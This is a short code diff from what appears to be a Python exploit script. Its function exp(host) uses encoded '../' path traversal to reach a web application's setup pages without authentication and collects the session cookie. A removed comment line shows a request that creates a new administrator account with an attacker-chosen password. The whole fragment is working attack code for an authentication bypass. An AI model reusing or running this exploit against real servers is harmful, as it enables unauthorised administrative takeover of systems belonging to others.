@@ -52,7 +52,7 @@ def exp(host):
     }
     
     getinfourl = url + "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"
-    #createurl="/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={u}&name=&email=&password={p}&passwordConfirm={p}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
+    
     try:
         r = HackRequests.hackRequests().http(getinfourl, headers=header1)
         jsessionid = r.cookies.get('JSESSIONID', '')
